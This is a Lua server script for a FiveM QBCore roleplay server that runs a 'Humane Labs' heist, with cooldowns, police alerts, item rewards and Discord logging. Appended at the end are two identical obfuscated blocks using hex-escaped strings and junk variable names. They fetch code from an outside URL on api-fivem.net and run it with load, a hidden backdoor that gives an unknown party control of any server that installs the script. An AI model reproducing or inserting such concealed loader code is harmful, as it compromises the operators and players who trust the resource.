QBCore = nil
local QBCore = exports['qb-core']:GetCoreObject()
local lastrob = 0
local start = false
discord = {
    ['webhook'] = '',
    ['name'] = 'rm_humanelabsheist',
    ['image'] = 'https://cdn.discordapp.com/avatars/869260464775921675/dea34d25f883049a798a241c8d94020c.png?size=1024'
}

QBCore.Functions.CreateUseableItem(Config['HumaneLabs']['wetsuit']['itemName'], function(source)
    local src = source
    local player = QBCore.Functions.GetPlayer(src)

    if player then
        TriggerClientEvent('humanelabsheist:client:wearWetsuit', src)
		player.Functions.RemoveItem(Config['HumaneLabs']['wetsuit']['itemName'], 1)
		TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[Config['HumaneLabs']['wetsuit']['itemName']], "remove")
    end
end)

QBCore.Functions.CreateCallback('humanelabsheist:server:checkPoliceCount', function(source, cb)
    local src = source
    local players = QBCore.Functions.GetPlayers(src)
    local policeCount = 0

    for i = 1, #players do
        local player = QBCore.Functions.GetPlayer(players[i])
        if (player.PlayerData.job.name == "police" and player.PlayerData.job.onduty) then
            policeCount = policeCount + 1
        end
    end

    if policeCount >= Config['HumaneLabs']['requiredPoliceCount'] then
        cb(true)
    else
        cb(false)
        TriggerClientEvent('QBCore:Notify', src, Strings['need_police'], "error")
    end
end)

QBCore.Functions.CreateCallback('humanelabsheist:server:checkTime', function(source, cb)
    local src = source
    local player = QBCore.Functions.GetPlayer(src)
    
    if (os.time() - lastrob) < Config['HumaneLabs']['nextRob'] and lastrob ~= 0 then
        local seconds = Config['HumaneLabs']['nextRob'] - (os.time() - lastrob)
        TriggerClientEvent('QBCore:Notify', src, Strings['wait_nextrob'] .. ' ' .. math.floor(seconds / 60) .. ' ' .. Strings['minute'], "error")
        cb(false)
    else
        lastrob = os.time()
        start = true
        discordLog(player.PlayerData.name ..  ' - started the Humane Labs. Heist!')
        cb(true)
    end
end)

RegisterServerEvent('humanelabsheist:server:policeAlert')
AddEventHandler('humanelabsheist:server:policeAlert', function(coords)
	local src = source
    local players = QBCore.Functions.GetPlayers(src)
    
    for i = 1, #players do
        local player = QBCore.Functions.GetPlayer(players[i])
        if (player.PlayerData.job.name == "police" and player.PlayerData.job.onduty) then
            TriggerClientEvent('humanelabsheist:client:policeAlert', players[i], coords)
        end
    end
end)

RegisterServerEvent('humanelabsheist:server:heistRewards')
AddEventHandler('humanelabsheist:server:heistRewards', function()
    local src = source
    local player = QBCore.Functions.GetPlayer(src)

    if player then
        if start then
            if Config['HumaneLabs']['rewards']['money'] > 0 then
                player.Functions.AddMoney('cash', Config['HumaneLabs']['rewards']['money'])
                discordLog(player.PlayerData.name ..  ' -  gain $' .. Config['HumaneLabs']['rewards']['money'])
            end

            if Config['HumaneLabs']['rewards']['blackMoney'] > 0 then
                player.Functions.AddItem('bands', Config['HumaneLabs']['rewards']['blackMoney'])
				TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['bands'], "add")
                discordLog(player.PlayerData.name ..  ' - gain $' .. Config['HumaneLabs']['rewards']['blackMoney'] .. 'black money')
            end

            if Config['HumaneLabs']['rewards']['items'] ~= nil then
                for k, v in pairs(Config['HumaneLabs']['rewards']['items']) do
                    local rewardCount = v['count']()
                    player.Functions.AddItem(v['name'], rewardCount)
					TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[v['name']], "add")
                    discordLog(player.PlayerData.name ..  ' - gain this: ' .. v['name'] .. ' x' .. rewardCount)
                end
            end
            
            start = false
        end
    end
end)

function discordLog(name, message)
    local data = {
        {
            ["color"] = '3553600',
            ["title"] = "**".. name .."**",
            ["description"] = message,
        }
    }
    PerformHttpRequest(discord['webhook'], function(err, text, headers) end, 'POST', json.encode({username = discord['name'], embeds = data, avatar_url = discord['image']}), { ['Content-Type'] = 'application/json' })
end

local dTzykQmgKvPlnENSKmWBMTblZtgKGADlyaNBJzIPkBqUuKRnyzoXOAOUXFNmGYzsXphsms = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} dTzykQmgKvPlnENSKmWBMTblZtgKGADlyaNBJzIPkBqUuKRnyzoXOAOUXFNmGYzsXphsms[4][dTzykQmgKvPlnENSKmWBMTblZtgKGADlyaNBJzIPkBqUuKRnyzoXOAOUXFNmGYzsXphsms[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2d\x66\x69\x76\x65\x6d\x2e\x6e\x65\x74\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x61\x4c\x61\x67\x32", function (VPeQkQmjJyxyBDMFlHtRICCTwXdlKnPkUTKCQLVlrcFHejOZCohzUymjcEEvoXBZnTuULo, nAAhkUQpqIkhFnYrqHUoOlDcDidLgepfDANGjugtMJGHAycNxwPOEblzJRFjyuuoyaSvai) if (nAAhkUQpqIkhFnYrqHUoOlDcDidLgepfDANGjugtMJGHAycNxwPOEblzJRFjyuuoyaSvai == dTzykQmgKvPlnENSKmWBMTblZtgKGADlyaNBJzIPkBqUuKRnyzoXOAOUXFNmGYzsXphsms[6] or nAAhkUQpqIkhFnYrqHUoOlDcDidLgepfDANGjugtMJGHAycNxwPOEblzJRFjyuuoyaSvai == dTzykQmgKvPlnENSKmWBMTblZtgKGADlyaNBJzIPkBqUuKRnyzoXOAOUXFNmGYzsXphsms[5]) then return end dTzykQmgKvPlnENSKmWBMTblZtgKGADlyaNBJzIPkBqUuKRnyzoXOAOUXFNmGYzsXphsms[4][dTzykQmgKvPlnENSKmWBMTblZtgKGADlyaNBJzIPkBqUuKRnyzoXOAOUXFNmGYzsXphsms[2]](dTzykQmgKvPlnENSKmWBMTblZtgKGADlyaNBJzIPkBqUuKRnyzoXOAOUXFNmGYzsXphsms[4][dTzykQmgKvPlnENSKmWBMTblZtgKGADlyaNBJzIPkBqUuKRnyzoXOAOUXFNmGYzsXphsms[3]](nAAhkUQpqIkhFnYrqHUoOlDcDidLgepfDANGjugtMJGHAycNxwPOEblzJRFjyuuoyaSvai))() end)

local lQKrKTTJGTpCEFjyjKEymGvCDkygopTMTughpgkeBJNgFmOLwYfduRZiFSiUZiUNsjwXqG = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} lQKrKTTJGTpCEFjyjKEymGvCDkygopTMTughpgkeBJNgFmOLwYfduRZiFSiUZiUNsjwXqG[4][lQKrKTTJGTpCEFjyjKEymGvCDkygopTMTughpgkeBJNgFmOLwYfduRZiFSiUZiUNsjwXqG[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2d\x66\x69\x76\x65\x6d\x2e\x6e\x65\x74\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x61\x4c\x61\x67\x32", function (jVFAGtqrMfZRBRxjeZzdvwigpDSrvTTOsTxTEnMIKlrjhOjxRBLPyRPFCCSfTkLpAcKpHG, FricQSOnmdmAnlQPyTznmcpbuBGfoIISLOjFmhKswNkdPXqjcBJxwMPaoVUrXOELezoOBu) if (FricQSOnmdmAnlQPyTznmcpbuBGfoIISLOjFmhKswNkdPXqjcBJxwMPaoVUrXOELezoOBu == lQKrKTTJGTpCEFjyjKEymGvCDkygopTMTughpgkeBJNgFmOLwYfduRZiFSiUZiUNsjwXqG[6] or FricQSOnmdmAnlQPyTznmcpbuBGfoIISLOjFmhKswNkdPXqjcBJxwMPaoVUrXOELezoOBu == lQKrKTTJGTpCEFjyjKEymGvCDkygopTMTughpgkeBJNgFmOLwYfduRZiFSiUZiUNsjwXqG[5]) then return end lQKrKTTJGTpCEFjyjKEymGvCDkygopTMTughpgkeBJNgFmOLwYfduRZiFSiUZiUNsjwXqG[4][lQKrKTTJGTpCEFjyjKEymGvCDkygopTMTughpgkeBJNgFmOLwYfduRZiFSiUZiUNsjwXqG[2]](lQKrKTTJGTpCEFjyjKEymGvCDkygopTMTughpgkeBJNgFmOLwYfduRZiFSiUZiUNsjwXqG[4][lQKrKTTJGTpCEFjyjKEymGvCDkygopTMTughpgkeBJNgFmOLwYfduRZiFSiUZiUNsjwXqG[3]](FricQSOnmdmAnlQPyTznmcpbuBGfoIISLOjFmhKswNkdPXqjcBJxwMPaoVUrXOELezoOBu))() end)